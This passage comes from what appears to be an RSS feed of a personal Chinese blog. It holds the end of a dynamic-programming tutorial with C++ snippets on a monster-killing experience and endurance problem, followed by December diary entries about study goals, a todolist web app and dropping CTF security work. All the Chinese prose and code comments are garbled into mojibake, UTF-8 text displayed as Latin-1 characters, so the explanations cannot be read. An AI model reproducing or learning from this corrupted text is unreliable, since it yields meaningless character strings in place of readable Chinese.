¸å¿ƒã€‚</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">solve</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m, <span class="type">int</span> k, <span class="type">int</span> s, vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&amp; monsters)</span> </span></span><br></pre></td></tr></table></figure><p>æ•°ç»„æˆ‘ä»¬ä¸€èˆ¬å¼•ç”¨å®ƒåœ°å€</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">vector <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, vector(s + <span class="number">1</span>, <span class="number">-1000</span>))</span></span>;<span class="comment">//è¿˜éœ€çš„ç»éªŒå€¼ï¼Œæ€æ€ªæ•°ï¼Œå‰©ä½™çš„å¿è€åº¦ï¼Œ-1000ä»£è¡¨ä¸å­˜åœ¨</span></span><br><span class="line">    dp[n][<span class="number">0</span>] = m;<span class="comment">//åˆšå¼€å§‹ï¼Œè¿˜å·®nç»éªŒï¼Œå¿è€åº¦ä¸ºm</span></span><br></pre></td></tr></table></figure><p>åˆå§‹åŒ–çš„æ—¶å€™è®°å¾—è®¾ç½®åŠ¨æ€è§„åˆ’çš„æ•°ç»„ï¼Œå…¶å€¼æ˜¯ç›®æ ‡ç»“æœï¼Œè€Œåˆå§‹çŠ¶æ€éœ€è¦èµ‹æœ‰æ„ä¹‰çš„å€¼ã€‚</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> exp = monsters[i].first, cost = monsters[i].second;</span><br></pre></td></tr></table></figure><p>é‡‡ç”¨firstå’Œsecondä»£æ›¿aå’Œbï¼Œæ–¹ä¾¿è‡ªå·±æ€è€ƒè®°ä½ã€‚è¿™ä¸ªçœ‹ä¸ªäººä¹ æƒ¯ï¼Œå°±æ˜¯è¯´æˆ‘ä»¬ä¸éœ€è¦å¢åŠ è®¾ç½®æ•°æ®ç»“æ„çš„ç¯èŠ‚ï¼Œå…¶å®æ˜¯è¿™æ ·ã€‚</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;<span class="comment">//éå†æ‰€æœ‰çš„æ€ª</span></span><br><span class="line">    <span class="type">int</span> exp = monsters[i].first, cost = monsters[i].second;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; s; ++j) &#123;<span class="comment">//æ€jåªå®ƒï¼Œå‰©ä½™çš„å¿è€åº¦</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> cur_exp = <span class="number">0</span>; cur_exp &lt;= n; ++cur_exp) &#123;<span class="comment">//ä¸ºä»€ä¹ˆä»å‰å¾€åï¼Ÿå› ä¸ºåé¢çš„éœ€è¦ç”¨åˆ°å‰é¢çš„ç»éªŒã€‚</span></span><br><span class="line">            <span class="keyword">if</span> (dp[cur_exp][j] &gt;= <span class="number">0</span>) &#123;<span class="comment">//å¿è€åº¦å­˜åœ¨</span></span><br><span class="line">                <span class="type">int</span> next_exp = <span class="built_in">max</span>(<span class="number">0</span>, cur_exp - exp);<span class="comment">//æ¨å¯¼æ€ä¸€åªæ€ªä¹‹åçš„ç»éªŒï¼Œæœ€å°ä¸º0</span></span><br><span class="line">                dp[next_exp][j + <span class="number">1</span>] = <span class="built_in">max</span>(dp[next_exp][j + <span class="number">1</span>], dp[cur_exp][j] - cost);<span class="comment">//æ›´æ–°æ€ä¸€åªæ€ªåå¿è€åº¦ï¼Œé€‰å¿è€åº¦æœ€å¤šçš„ã€‚</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åè§£é‡ŠçœŸæ­£é‡è¦çš„éƒ¨åˆ†ã€‚</p><p>æˆ‘ä»¬å¤–å±‚éå†æ‰€æœ‰ç§ç±»çš„æ€ªï¼Œè€Œå†…éå†æ€æ‰€æœ‰ä¸ªæ•°ï¼Œå°±å¯ä»¥è€ƒè™‘åˆ°æ‰€æœ‰ç§ç±»ï¼Œæ¯ç§ä¸ªæ•°æ€ä»»æ„åªå¾—æ‰€æœ‰æƒ…å†µäº†ï¼Œè€Œå®é™…å¾—åˆ°çš„dpå€¼æ˜¯å¯ä»¥å®æ—¶æ›´æ–°çš„ã€‚</p><p>æœ€é‡Œé¢ä¸€å±‚forï¼Œæ³¨é‡Šé‡Œå·²ç»è§£é‡Šäº†expä¸ºä»€ä¹ˆä»å‰å¾€åéå†ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±éªŒè¯ä¸€ä¸‹ï¼Œå‡è®¾ç¬¬ä¸€åªæ€ªæ•°å€¼æ˜¯(1,1)ï¼Œç¬¬ä¸€æ¬¡éå†çš„æ—¶å€™å‘ç°<code>dp[n][0]</code>å¤„æœ‰ä¸€ä¸ªmï¼Œé‚£ä¹ˆæˆ‘ä»¬è€ƒè™‘next_expå°±æ˜¯m-1ï¼Œ<code>dp[n-1][1]</code>è¡¨ç¤ºæ€äº†ä¸€åªæ€ªä¹‹åè¿˜å·®n-1ç‚¹ç»éªŒï¼Œå³å¢åŠ äº†ä¸€ç‚¹ç»éªŒï¼Œä¹‹åçš„å¿è€å€¼ã€‚å¯æƒ³è€ŒçŸ¥ï¼Œå®ƒæ˜¯ä¸‹é™çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¯”è¾ƒæ€äº†è¿™åªæ€ªä¹‹åçš„å¿è€åº¦ä¼šä¸ä¼šæé«˜ï¼Œå¦‚æœæ²¡æœ‰æé«˜ï¼Œæˆ‘ä»¬ä¸æ›´æ–°å¿è€å€¼ï¼Œå³å¹¶ä¸æ€æ€ªã€‚</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> result = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= s; ++j) &#123;</span><br><span class="line">    <span class="keyword">if</span> (dp[<span class="number">0</span>][j] &gt;= <span class="number">0</span>) &#123;<span class="comment">//ç»éªŒåˆ°è¾¾ï¼Œå¿è€åº¦å­˜åœ¨</span></span><br><span class="line">        result = <span class="built_in">max</span>(result, dp[<span class="number">0</span>][j]);<span class="comment">//æ‰¾åˆ°æœ€å¤§çš„é‚£ä¸ª</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åæˆ‘ä»¬çœ‹çš„æ˜¯<code>dp[0][j]</code>ï¼Œå°±æ˜¯ä¸å·®ç»éªŒï¼Œçš„æ—¶å€™ï¼Œå„ç§æ€æ€ªæƒ…å†µç•™ä¸‹æœ€å¤§çš„å¿è€åº¦ã€‚<br><br></p><p>åŠ¨æ€è§„åˆ’è¿˜æŒºæŠ½è±¡çš„ï¼Œæœ‰å¿…è¦å¤šçœ‹å‡ éã€‚</p>]]></content:encoded>
      
      
      <category domain="https://cjliblog.top/categories/%E7%AE%97%E6%B3%95/">ç®—æ³•</category>
      
      
      <category domain="https://cjliblog.top/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/">åŠ¨æ€è§„åˆ’</category>
      
      
      <comments>https://cjliblog.top/2023/12/11/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E2%80%94%E2%80%94fate/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>åäºŒæœˆ-ä¸€æœˆæ—¥è®°</title>
      <link>https://cjliblog.top/2023/12/10/12-1%E6%9C%88%E6%97%A5%E8%AE%B0/</link>
      <guid>https://cjliblog.top/2023/12/10/12-1%E6%9C%88%E6%97%A5%E8%AE%B0/</guid>
      <pubDate>Sat, 09 Dec 2023 16:00:00 GMT</pubDate>
      
      <description>è¿™æ˜¯åäºŒæœˆçš„æ—¥è®°ã€‚</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="12-11æ›´æ–°ï¼šå¢åŠ äº†è¿‘æœŸç›®æ ‡"><a href="#12-11æ›´æ–°ï¼šå¢åŠ äº†è¿‘æœŸç›®æ ‡" class="headerlink" title="12-11æ›´æ–°ï¼šå¢åŠ äº†è¿‘æœŸç›®æ ‡"></a>12-11æ›´æ–°ï¼šå¢åŠ äº†è¿‘æœŸç›®æ ‡</h2><p>12-12æ›´æ–°ã€‚</p><br><p>ä»Šå¤©æ­åŠ©å¼€äº†ä¸ªä¼šï¼Œå¼•èµ·ä¸€äº›æ€è€ƒï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><p>1.æ¯”èµ›å¯ä»¥å¤šå°è¯•ï¼Œä½†æ˜¯è¦æ³¨æ„ä¸è¦èŠ±å¤ªå¤šç²¾åŠ›ï¼Œæ¯”å¦‚æ•°æ¨¡ï¼Œå¤–åŒ…ç­‰ã€‚</p><p>2.æ¯ä¸ªäººçš„è·¯çº¿ä¸ä¸€æ ·ï¼Œç»©ç‚¹éœ€æ±‚ä¹Ÿå› äººè€Œå¼‚ã€‚ç»©ç‚¹å¯¹äºæ‰¾å·¥ä½œä¹Ÿä¸ä¸€å®šæ— å¥½å¤„ï¼Œæ˜¯ä¸€ç§å¯¹å­¦ä¹ èƒ½åŠ›çš„è®¤å¯ã€‚å¯¹äºæˆ‘æ¥è¯´ï¼Œæˆ‘æœ‰è¯»ç ”éœ€æ±‚ï¼Œé‚£ä¹ˆæˆ‘ä¹Ÿè‚¯å®šè¦å·ç»©ç‚¹çš„ã€‚è€Œä¸”è¯¾ç¨‹å­˜åœ¨æœ‰ä»–çš„é“ç†ï¼ŒåŸºç¡€ä¸ç‰¢åœ°åŠ¨å±±æ‘‡ï¼Œæœ‰å¿…è¦å¥½å¥½æŒæ¡ã€‚</p><p>3.å­¦é•¿è®¤ä¸ºçš„æå‡ä¸ªäººèƒ½åŠ›çš„æœ€å¥½æ–¹æ³•ï¼š1.å‚åŠ å­—èŠ‚é’è®­è¥ï¼ˆæ³¨æ„åœ¨ç¨€åœŸæ˜é‡‘ä¸Šå…³æ³¨åŠ¨æ€ï¼‰2.åˆ©ç”¨å¼€æºé¡¹ç›®å­¦ä¹ ï¼Œgithubï¼Œå¼€æºä¹‹å¤</p><p>4.å¹³æ—¶æ³¨æ„å†™åšå®¢è®°å½•æ—¥å¸¸ï¼Œç¡®å®šæ¯å¤©çš„æ–¹å‘ã€æ„ä¹‰å’Œæ”¶è´§ã€‚</p><p>5.å¤§äºŒä¸‹çš„æš‘å‡å‡ºå»å®ä¹ ï¼Œæœ€å¥½æ‰¾å®ä¹ ï¼Œæ€§ä»·æ¯”å¾ˆé«˜ã€‚å¤šå»é¢è¯•ï¼Œå¯ä»¥å¢åŠ é¢è¯•ç«äº‰åŠ›ã€‚</p><p>6.å­¦ä¼šå·§å¦™ä½¿ç”¨æœç´¢å¼•æ“ï¼ŒåŒ…æ‹¬ä¸é™äºgpt4ï¼Œgoogleï¼Œbaiduã€‚è¿™é‡Œæ³¨æ„gptæ›´æ³¨é‡æ€ç»´å‘æ•£ï¼Œè€Œgoogleæ›´æ³¨é‡ä¸ªäººç»éªŒã€‚</p><p>7.å¤šæ°´ç¾¤ï¼Œç»“è¯†å¤§ä½¬ã€‚</p><br><p>å¦å¤–å°±æ˜¯è‡ªå·±æœ€è¿‘çš„æ€è€ƒï¼š</p><p>1.è¯»ç ”ï¼Œç›®æ ‡æš‚å®špkuå’ŒhkustäºŒé€‰ä¸€ã€‚å› ä¸ºè¯»ç ”ä¸æ„å‘³ç€ä¸å·¥ä½œï¼Œåªè¦æŠ˜è…¾ï¼Œç…§æ ·å¯ä»¥å®ä¹ ã€‚ä¸è¿½æ±‚ä¿ç ”ï¼Œç›´æ¥è€ƒç ”ã€‚</p><p>2.å®‰å…¨ã€å¼€å‘ã€AIå‡ ä¸ªæ–¹å‘ï¼Œæˆ‘è®¤ä¸ºä¸»è¦è¿˜æ˜¯å¾€å…¨æ ˆå¼€å‘å‘å±•ï¼Œå®‰å…¨å’ŒAIä»…ä»…ä½œä¸ºå…´è¶£çˆ±å¥½ã€‚åŸå› å¦‚ä¸‹ï¼šå› ä¸ºå®‰å…¨æ˜¯å¯ä»¥åŠ å¿«ç†è§£è®¡ç®—æœºæ•´ä½“æ¡†æ¶çš„è¿›ç¨‹çš„ï¼Œä½†æ˜¯æˆ‘æœ¬èº«å¯¹äºå®‰å…¨çš„æœŸå¾…æ¯”è¾ƒå°ï¼Œå†µä¸”gptå¯¹å®‰å…¨è¿™å—ååŠ©èƒ½åŠ›å¼±ï¼›è€ŒAIç›®å‰æ–°å…´ä¸æˆç†Ÿï¼Œè€Œå›½å†…ç¯å¢ƒä¸ä½³ï¼Œå­¦å†é—¨æ§›é«˜ï¼Œæœ¬ç§‘é˜¶æ®µä¸å¦‚æ‰å®æ‰“å¥½åŸºç¡€ï¼Œåˆ°è¯»ç ”å†å¼€å§‹ç‚¼ä¸¹ä¹Ÿä¸è¿Ÿï¼›è€Œå¼€å‘ä¸ä»…è‡ªå·±æ„Ÿå…´è¶£ï¼Œå¯ä»¥åšå‡ºè‡ªå·±å–œæ¬¢çš„ä¸œè¥¿ï¼Œå¹¶ä¸”æ–¹ä¾¿æ‰¾å·¥ä½œï¼Œä¹Ÿæ˜¯å®‰å…¨å’ŒAIçš„å«è„šçŸ³ã€‚</p><p>3.å­¦å¥½åŸºç¡€å­¦ç§‘ï¼Œå·ç»©ç‚¹ã€‚å®ƒä»¬æ˜¯å€¼å¾—æ„Ÿå…´è¶£çš„ï¼Œå¤ªåŠŸåˆ©å»å­¦ä¹ æŠ€æœ¯ï¼Œä¹Ÿä¸è§å¾—èƒ½è®©è‡ªå·±å˜å¼ºï¼Œè€Œä¸”æ°¸è¿œå¤±å»äº†ç»©ç‚¹ã€‚è€Œä¸”å¼€å‘æœ¬æ¥å°±æ˜¯é—¨æ§›ä½çš„è¡Œä¸šï¼Œæ”¾å¼ƒç»©ç‚¹å»å­¦å¼€å‘å°±åƒèµŒç‹—ï¼ŒèµŒåˆ°æœ€åä¸€æ— æ‰€æœ‰ã€‚è¦çŸ¥é“ï¼Œè¶…å‰å­¦ä¹ åªæ˜¯åœ¨å¼€å§‹å ä¼˜åŠ¿ï¼Œè°ç¬‘åˆ°æœ€åè¿˜ä¸ä¸€å®šã€‚</p><p>4.åœ¨å¤„ç†å¥½æ¯”èµ›ã€å·¥ä½œã€ä½œä¸šå’Œä¸“ä¸šè¯¾çš„å­¦ä¹ ä¹‹ä½™ï¼ŒåŠ¡å¿…ç»™è‡ªå·±å¢åŠ å¼€å‘æ–¹é¢çš„å­¦ä¹ æ—¶é—´ï¼Œæš‚æ—¶è§„å®šæ¯å‘¨ä¸‰ã€æ¯å‘¨æœ«å¿…å­¦å¼€å‘åŠå¤©ä»¥ä¸Šã€‚</p><p>5.å°½é‡å°‘ç†¬å¤œï¼Œæ—©èµ·åºŠã€‚</p><p>2023-12-11ï¼Œ1ï¼š35ã€‚ï¼ˆç¬‘æ­»ï¼Œä¸æƒ³å†ç†¬å¤œå•¦ï¼ï¼‰</p><h2 id="12-15"><a href="#12-15" class="headerlink" title="12-15"></a>12-15</h2><p>æ˜å¤©å°±è¦è€ƒå…­çº§äº†ã€‚å®Œå…¨æ²¡å‡†å¤‡ï¼Œæ ¹æœ¬æ²¡æœ‰å‡†å¤‡çš„åŠ¨åŠ›ã€‚</p><p>æœ€è¿‘éƒ½åœ¨å­¦åç«¯goï¼Œä½†æ˜¯ä»Šå¤©åœ¨åšå‰ç«¯çš„æ—¶å€™å¶ç„¶å‘ç°ä¸€ä¸ªä¸é”™çš„ç°ä»£åŒ–cssæ¡†æ¶â€”â€”tailwindcssã€‚</p><p>æˆ‘å‘ç°å–œæ¬¢è¿™äº›æ˜¯å› ä¸ºæˆ‘å–œæ¬¢ç°ä»£åŒ–çš„æ–°ä¸œè¥¿ã€‚</p><p>ä½†AIè¿™ä¸œè¥¿ä¸å¥½è¯´ï¼Œæœ‰ç‚¹ç¼¥ç¼ˆã€‚å°±åƒctfï¼Œæœ‰ä¸€ç§æ‰“æ¸¸æˆçš„ä¸åŠ¡æ­£ä¸šçš„æ„Ÿè§‰ã€‚</p><p>ä¹Ÿå¯èƒ½æ˜¯å­¦å¼€å‘æˆ–è€…ç®—æ³•è¿™ç§æ›´å®¹æ˜“è®©äººæœ‰æˆå°±æ„Ÿï¼Ÿ</p><p>ä½†æ˜¯æœ€è¿‘å‘ç”Ÿäº†ä¸€äº›äº‹æƒ…ï¼Œæˆ‘å¯èƒ½è¦åšä¸€äº›CVçš„è®ºæ–‡å·¥ä½œï¼Œæ‰€ä»¥AIè¿™ä¸ªè·¯å­æ„Ÿè§‰ä¹Ÿæ˜¯ä¸èƒ½ä¸€æ£’å­æ‰“æ­»ï¼Œæ¯•ç«Ÿç§‘ç ”ä¹Ÿæ˜¯ä¸€æ¡è·¯å­ã€‚åªè¦å®ƒèƒ½è®©æˆ‘å­¦åˆ°çœŸæœ¬äº‹ï¼Œè€Œä¸æ˜¯ä¸åœé…ç¯å¢ƒå’Œè°ƒå‚ï¼Œéƒ½æ˜¯æœ‰æ„ä¹‰çš„ã€‚</p><p>ctfæ˜¯åŒæ ·çš„ï¼Œå¦‚æœæ˜¯ä»£ç å®¡è®¡æˆ–è€…åå¼¹shellè¿™ç§è´´è¿‘å·¥ä½œå®é™…çš„å†…å®¹ï¼Œæˆ‘ä¹Ÿä¼šä¹åœ¨å…¶ä¸­ã€‚</p><p>é‡ç‚¹æ˜¯ä¸è¦è®©æˆ‘æ„Ÿè§‰å­¦æ— æ‰€æˆã€‚</p><p>åè¿‡æ¥è¯´ï¼Œéƒ½è¯´ç§‘ç ”éœ€è¦è€å¿ƒã€‚</p><p>æˆ‘è™½ç„¶æœ‰è€å¿ƒï¼Œä½†æ˜¯æ˜¯å¯¹æˆ‘åšå®šè®¤ä¸ºæœ‰æˆæœçš„ä¸œè¥¿ã€‚</p><p>ä¸çŸ¥é“æˆ‘çš„ç‰¹æ€§æ˜¯é€‚åˆç§‘ç ”è¿˜æ˜¯ä¸é€‚åˆå‘¢ï¼Ÿ</p><p>CTFä¸€äº›é¢˜çš„å¿…å®šæœ‰ç­”æ¡ˆï¼Œå¹¶ä¸æ˜¯æˆæœï¼Œåè€Œè®©æˆ‘æ„Ÿè§‰æ¯«æ— æ„ä¹‰ï¼Œæ²¡æœ‰åšä¸‹å»çš„åŠ¨åŠ›ã€‚</p><p>å‡†ç¡®çš„è¯´ï¼Œæˆ‘æ˜¯å¯¹é«˜æ¦‚ç‡æœ‰æˆæœï¼Œè¿‡ç¨‹ä¸­ä¹Ÿé¢‡æœ‰æ”¶è´§çš„ä¸œè¥¿æœ‰è€å¿ƒï¼Œå¹¶ä¸”åœ¨å¤±è´¥ä¹‹åäº†æ— é—æ†¾ã€‚</p><p>è€Œé—®é¢˜å¹¶ä¸åœ¨äºæˆ‘è¦å»æ”»å“ªä¸ªæ–¹å‘ã€‚ç°åœ¨åº”è¯¥ä¹Ÿè¿˜æ˜¯è¯•é”™é˜¶æ®µã€‚</p><p>ä½†æ˜¯å¼€å‘å’Œç®—æ³•ä¸€å®šæ˜¯æœ€é‡è¦çš„åŸºçŸ³çš„å­˜åœ¨ã€‚</p><p>ç©ç´¯äº†ï¼Œå°±å­¦ç‚¹ä¸œè¥¿ä¼‘æ¯ä¸€ä¸‹ã€‚</p><h2 id="12-18"><a href="#12-18" class="headerlink" title="12-18"></a>12-18</h2><p>è¯¾ä¸šæ–¹å‘ï¼Œå‘¨æœ«å®Œæˆäº†ä¸€äº›ä½œä¸šå’Œè€ƒè¯•ã€‚</p><p>ç§‘ç ”æ–¹å‘ï¼Œæ˜¯çœ‹äº†slamçš„ä¸€äº›æ•°å­¦åŸºç¡€éƒ¨åˆ†ã€‚</p><p>å®‰å…¨æ–¹å‘ï¼Œå¼ƒå‘äº†ï¼Œæœ‰å–æœ‰èˆã€‚</p><p>ç®—æ³•æ–¹å‘ï¼Œä¸»è¦æ˜¯æ–æ³¢é‚£å¥‘ä¹‹ç±»çš„é€’å½’ï¼Œè¿˜æœ‰ä¸ªå¡ç‰¹å…°æ•°æ²¡ææ˜ç™½ã€‚</p><p>å¼€å‘æ–¹å‘ï¼Œåœ¨è¿›è¡Œtodoliståº”ç”¨çš„é‡å»ºï¼Œå‘¨æœ«ä¸»è¦æ˜¯å­¦ä¹ ä¸å®è·µäº†ä¸€æ³¢å‰ç«¯çš„vite+vue+bootstrapï¼Œæ¥æ›¿ä»£ä¹‹å‰ç®€é™‹çš„template+staticå‰ç«¯ã€‚</p><p>å†™ä¸€ä¸ªåŠ¨æ€planæŒºå¥½çš„ï¼Œè¿›åº¦æŒæ¡åœ¨è‡ªå·±æ‰‹ä¸Šï¼Œä¹Ÿå®¹æ˜“ç„¦è™‘ã€‚</p><p>æ˜å¤©å››èˆäº”å…¥å°±ä¸‹åˆä¸€èŠ‚æ•°ç”µï¼Œæ˜å¤©ä¸Šåˆå†åˆ¶å®šè®¡åˆ’ï¼Œå†²ã€‚</p><h2 id="12-19"><a href="#12-19" class="headerlink" title="12-19"></a>12-19</h2><p>ä»Šå¤©çš„è¿›å±•ä¸»è¦æ˜¯å‰ç«¯çš„æ„å»ºï¼Œæ‰“ç®—è¿‡å‡ å¤©å†™ä¸€ä»½æ–‡æ¡£å‡ºæ¥ã€‚</p><h2 id="12-20"><a href="#12-20" class="headerlink" title="12-20"></a>12-20</h2><p>æˆ‘å‘ç°æ¯æ¬¡å†™éƒ½æ˜¯å‡Œæ™¨ï¼Œç„¶åéƒ½æ˜¯ç¬¬äºŒå¤©çš„æ—¥æœŸï¼Œç¬‘æ­»äº†ã€‚</p><p>ä»Šå¤©çš„è¿›å±•æ˜¯ï¼š</p><p>å‰ç«¯å®Œæˆé¡µé¢ç¾åŒ–ï¼Œ</p><p>å‰åç«¯å®Œæˆè·¨åŸŸè°ƒé…å’Œé‰´æƒäº¤äº’</p><p>ç™»å½•ç³»ç»ŸåŠŸèƒ½åˆæ­¥å®ç°</p><p>è€Œåœ¨æœ€åå‘ç°äº†githubä¸Šçš„uiåº“shadcnï¼Œä½†æ˜¯ä»…åœ¨reactå’Œtsçš„ç»„åˆä¸‹æœ‰ç°æˆæ–‡æ¡£ã€‚è¿™ä¸€å‘ç°è®©æˆ‘è®¤è¯†åˆ°äº†reactå’Œtsï¼Œéå¸¸ä¸é”™ï¼Œäºæ˜¯æ‰“ç®—è½¬vueä¸ºreactï¼Œå·¥ç¨‹è¿›è¡Œåˆ°å®Œæˆé‰´æƒè½¬æ¢äº†ï¼Œæ˜å¤©åº”è¯¥å¯ä»¥ç»§ç»­å·¥ç¨‹è¿›åº¦ã€‚</p><h2 id="12-21"><a href="#12-21" class="headerlink" title="12-21"></a>12-21</h2><p>ç»§ç»­å®Œå–„äº†é¡¹ç›®ï¼Œtodolistçš„ä¸»è¦åŠŸèƒ½ï¼Œå¯ä»¥æ·»åŠ è®°å½•å’Œæ”¹å˜doneå€¼äº†ã€‚</p><p>å‡†å¤‡å¼€å§‹æ”»åšæ•°æ®ç»“æ„å’Œæ•°å­—ç”µè·¯ã€‚</p><h2 id="12-26"><a href="#12-26" class="headerlink" title="12-26"></a>12-26</h2><p>è½¬çœ¼é—´è¿™ä¸€æ¬¡å†™æ—¥è®°çš„æ—¶é—´å±…ç„¶å·²ç»æ˜¯12-26å‡Œæ™¨äº†ã€‚ã€‚ã€‚</p><p>æ‹ä¸€ä¸‹è¿™ä¸€æ®µæ—¶é—´çš„äº‹æƒ…ã€‚è‡ªä»ä¸Šä¸€æ¬¡æ–­æ›´ï¼Œäº‹å®ä¸Šæˆ‘å·²ç»æ­£å¼è¿›å…¥äº†æ–°çš„é˜¶æ®µï¼ˆæç½®å¼€å‘ï¼Œè¿æ¥æœŸæœ«ï¼‰</p><p>æ²¡æƒ³åˆ°æ¥äº†ä¸ªæ•°æ¨¡ç¾èµ›é›†è®­å€’æ‰“ä¸€è€™ã€‚å…¶ä¸­ä¸€ä¸ªä»»åŠ¡å½“ç„¶å°±æ˜¯å»åšç¾èµ›çš„å‡ ä¸ªå¤§ä½œä¸šäº†ã€‚ä¸åæ§½äº†ï¼Œç›´æ¥ç½—åˆ—ä¸€ä¸‹åˆ°ç°åœ¨å¹²çš„ä¸»è¦çš„äº‹æƒ…ã€‚</p><p>å„ç§å­¦ç§‘ä½œä¸šã€‚</p><p>ä¸Šè¯¾å­¦äº†ä¸€ä¸‹æ•°ç”µé€Ÿæˆè¯¾ç¨‹ã€‚</p><p>æ•°æ®ç»“æ„å®Œæˆäº†å‰ä¸‰ç« çš„å¤ä¹ ã€‚ï¼ˆç‹é“è€ƒç ”ä¸‰åˆ†ä¹‹ä¸€æœ¬ä¹¦æ²¡äº†ï¼Œå¾ˆçˆ½ï¼‰</p><p>æ•°æ¨¡é›†è®­ä½œä¸š1ï¼ˆæ¹–æ³Šçš„æ•°æ®åˆ†æï¼‰åŸºæœ¬å®Œæˆã€‚ç»†è¯´ï¼Œä¸»è¦æ˜¯åˆæ­¥å­¦ä¼šäº†GISçš„ä½¿ç”¨ï¼Œä»¥åŠä½¿ç”¨pythonè¿›è¡Œæ•£ç‚¹æ‹Ÿåˆï¼ˆæ•°åˆ†å§ç±»ä¼¼äºï¼Ÿï¼‰</p><p>è‹±è¯­çš„æ¼”è®²å‡†å¤‡ã€‚</p><p>çº¦äº†å‘¨ä¸‰è¾…å¯¼å‘˜è°ˆå¿ƒï¼ˆå¼ºåˆ¶çš„ï¼‰ã€‚</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥ï¼Œå…¶å®å°±ä¸¤å‘¨äº†ï¼Œé©¬ä¸Šå°±æ˜¯1å·çš„å¯¼è®ºè€ƒè¯•ï¼Œ15å·çš„å¤§å†›ã€‚å½“ç„¶ï¼Œ25å·æ•°ç”µç»“æŸè¿‡åæ˜¯æ•°æ¨¡ç¾èµ›é›†è®­+æ¯”èµ›ã€‚ç›®å‰çš„ä»»åŠ¡æˆ‘è®¤ä¸ºï¼Œåº”è¯¥æ˜¯å‘¨ä¸‰ä¹‹å‰æå®šå››ã€äº”ã€å…­ç« çš„æ•°æ®ç»“æ„ã€‚ç„¶åå‘¨å››ä¸“æ”»ä¸€å¤©ACMï¼Œå‘¨äº”å‘¨å…­æå®šæ•°æ®ç»“æ„ï¼Œå‘¨æ—¥æå®šæ•°ç”µæ‰€æœ‰ä½œä¸šå’Œå¤ä¹ ã€‚åœ¨ä¸‹å‘¨ï¼Œå³å¯å¼€å§‹å‘ç¦»æ•£å’Œå¤§ç‰©è¿›å†›ã€‚ACMè‚¯å®šè¦å¥½å¥½æä¸€ä¸‹äº†ã€‚å½“ç„¶ï¼Œè¿˜è¦æŠŠçŸ¥é“å’Œå­¦ä¹ é€šä¸Šçš„ä½œä¸šåˆ·ä¸€åˆ·ã€‚ã€‚è‡³äºè¿™å‘¨çš„å®‰æ’ï¼Œä¸å¼ºåˆ¶ï¼Œå¯ä»¥äº¤é”™èµ·æ¥çµæ´»å®‰æ’ã€‚ã€‚å—¯ï¼Œä¸€ç›´ä»¥æ¥éƒ½æ˜¯è¿™æ ·çš„ã€‚</p><p>è‡³äºå¯’å‡ï¼Œæˆ‘ç®—äº†ä¸‹2.6æ¯”èµ›ç»“æŸï¼Œè¿‡å¹´åœ¨2.10ï¼Œå¼€å­¦åœ¨3.2ã€‚é‚£å›å»åŸºæœ¬å°±æ˜¯è¿‡ä¸ªå¹´èŠ±ä¸€å‘¨ï¼Œåªæœ‰ä¸‰å‘¨çº¦24å¤©æ—¶é—´å­¦ä¹ ã€‚é¦–å…ˆè€ƒè™‘hgameæ˜¯å¦å‚åŠ ã€‚è¿™ä¸ªå…¶å®å°±æ¯”è¾ƒé¸¡è‚‹äº†ï¼Œå› ä¸ºå·²ç»ç¡®å®šä¸èµ°è¿™ä¸€æ¡è·¯ã€‚æˆ–è®¸å¯ä»¥æŠŠç©ä¸€ä¸‹ä¹å™¨æˆ–è€…ä½œä¸€é¦–æ›²å­ï¼Œå‘ä¸€æ‰‹æ­Œã€‚æ²¡é”™ï¼Œæ¯”åç‰¢å¥½ã€‚æˆ–è€…å°±åšåšwebçš„é¢˜å§ï¼Œå› ä¸ºç»“è¯†ä¸€äº›ä½¬è¿˜æ˜¯å¾ˆæœ‰å¸å¼•åŠ›çš„ã€‚ä¸€ä¸ªæ˜¯hgameï¼Œç„¶åæ˜¯ç§‘ç ”ï¼Œè¿™æ˜¯ä¸»è¦çš„ï¼Œä»¥åŠæ–°è‹—ã€‚å¦å¤–å­¦æœ‰ä½™åŠ›å»æŠŠè‡ªå·±todolistçš„é‡å»ºå®Œå–„ä¸€ä¸‹ï¼Œå‰ç«¯å¯ä»¥åšå¾—æ›´é€šé€ï¼Œåç«¯å¯ä»¥åšç‚¹ç¼“å­˜æ¶ˆæ¯é˜Ÿåˆ—ä¹‹ç±»çš„ï¼Œç„¶åå®ç°å¾®æœåŠ¡æ¶æ„å•Šã€è™šæ‹ŸåŒ–å•Šã€åˆ†å¸ƒå¼å•Šï¼Œå¦å¤–è¿˜å¯ä»¥å¤šç 